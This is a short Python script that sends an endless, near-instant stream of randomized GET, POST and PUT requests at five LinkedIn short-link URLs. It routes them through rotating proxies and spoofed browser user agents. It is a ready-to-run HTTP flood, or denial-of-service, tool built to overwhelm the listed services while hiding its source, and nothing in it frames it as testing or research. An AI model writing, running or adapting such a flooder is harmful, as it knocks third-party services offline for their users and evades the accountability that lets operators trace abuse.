import requests
import random
import time

# Load proxy list from GitHub
proxy_list = [
    "http://proxy1:port", "http://proxy2:port", "http://proxy3:port"
    # Add more proxies here from https://github.com/DeadmanXXXII/Free_Proxy_List/blob/main/README.md
]

# User agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    # Add more user agents here
]

# HTTP methods
http_methods = ["GET", "POST", "PUT"]

# Target URLs
urls = [
    "https://lnkd.in/emrjmnvZ",
    "https://lnkd.in/e3jSxi7g",
    "https://lnkd.in/e3pEtH6D",
    "https://lnkd.in/eDWrvvsS",
    "https://lnkd.in/e8hPSyBx"
]

# Infinite loop to send requests
while True:
    url = random.choice(urls)
    proxy = random.choice(proxy_list)
    user_agent = random.choice(user_agents)
    method = random.choice(http_methods)

    headers = {"User-Agent": user_agent}
    proxies = {"http": proxy, "https": proxy}

    try:
        if method == "GET":
            response = requests.get(url, headers=headers, proxies=proxies)
        elif method == "POST":
            response = requests.post(url, headers=headers, proxies=proxies)
        elif method == "PUT":
            response = requests.put(url, headers=headers, proxies=proxies)

        print(f"Request sent: {method} to {url} using {proxy} with {user_agent}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send request through {proxy}: {e}")

    # Short delay between requests
    time.sleep(0.0001)
